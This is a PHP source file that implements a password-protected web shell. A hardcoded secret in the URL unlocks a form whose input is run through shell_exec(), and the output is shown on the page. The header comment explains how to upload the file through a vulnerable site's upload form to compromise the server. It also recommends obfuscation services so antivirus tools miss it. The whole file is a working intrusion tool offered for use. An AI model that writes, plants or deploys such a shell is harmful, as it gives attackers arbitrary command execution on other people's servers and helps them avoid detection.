<?php
/* 
 * console.php
 * 
 * Experimental code to test the remote command execution 
 * through a simple PHP form and shell_exec()
 * https://www.php.net/manual/es/function.shell-exec.php
 * 
 * If you can upload this file through a form on some website, and the php 
 * configuration does not have the "safe mode" activated, 
 * https://www.php.net/manual/es/features.safe-mode.php
 * then the security of the system could be violated by executing certain 
 * commands.
 * 
 * Author  : Gabriel Marti
 * Twitter : Bl4ckH0l3 @H0l3Bl4ck
 * 
 * Example url call:    
 * 
 * http://host:port/console.php?secret=YourSecretCode
 *   
 * The code can be obfuscated with an external tool that could make it 
 * difficult to detect by antivirus.
 * 
 * Obfuscators: 
 *  Good    -   https://www.tools4nerds.com/online-tools/php-obfuscator
 *  Great   -   https://www.php-obfuscator.com/
 *    
 */

// Insert here your harcoded pass
$auth = "b14ck";                

$secret = isset($_GET['secret']) ? $_GET['secret'] : ''; 

if ($secret === '' || $secret === false || $secret === null ) {
    die('Bad Secret!!!');
} elseif ($secret != $auth) {
    die('Bad Auth!!!');
}

$basename = basename(__FILE__);
$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : '';

if ($cmd === '' || $cmd === false || $cmd === null ) {
    $result = "No cmd".PHP_EOL;
} else {
    $result = htmlentities(utf8_decode(shell_exec($cmd)), ENT_SUBSTITUTE);
    $cmd = htmlentities($cmd, ENT_SUBSTITUTE);
}

$html_form = <<<EOD
<html><body>
<div><form action="$basename?secret=$secret" method="post">
CMD: <input type="text" size="60" name="cmd"> <input type="submit"><br>
</form></div>
<div><pre>CMD: $cmd</pre><br>
<pre>$result</pre></div>
</body></html>    
EOD;

echo $html_form;

    
